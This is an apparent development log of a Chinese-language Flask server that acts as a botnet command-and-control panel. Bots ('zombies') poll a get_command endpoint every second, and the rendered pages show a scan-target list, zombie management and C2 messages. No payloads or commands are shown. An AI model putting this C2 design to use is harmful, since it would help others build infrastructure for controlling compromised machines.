2025-06-25 00:27:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:31 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:32 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:33 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:34 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:35 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:36 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:37 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:38 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:39 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:40 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:41 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:42 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:43 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:44 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:45 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:46 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:47 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:48 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:49 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:50 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:51 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:52 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:53 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:54 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:55 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:56 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:57 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:58 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:27:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:27:59 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:27:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:27:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:27:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:28:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:28:20 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:28:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:28:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:28:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:28:36 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:28:36 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:28:36 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:28:36 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:28:36 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:28:36 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:28:36 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:28:36 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:28:36 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:28:36 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:28:36 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:28:36 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:28:36 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:28:36 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:28:36 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:28:36 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:28:36 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:28:36 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:28:36 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:28:36 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:28:36 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:28:36 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:28:36 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 00:28:36 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 00:28:40 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:28:40 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:28:40 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:28:40 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:28:40 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:28:40 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:28:40 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:28:40 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:28:40 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:28:40 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:28:40 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:28:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-25 00:28:50 | INFO     | index_routes.py:15 | index() | 用戶訪問首頁
2025-06-25 00:28:50 | INFO     | index_routes.py:18 | index() | 查詢到 0 個目標
2025-06-25 00:28:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0333s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>扫描目标管理系统</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n    </body>\n    \n</html>'
2025-06-25 00:28:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:28:50] "GET / HTTP/1.1" 200 -
2025-06-25 00:28:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:28:50] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:28:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:28:50] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:29:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.1579s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:29:25 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 00:29:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0053s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" 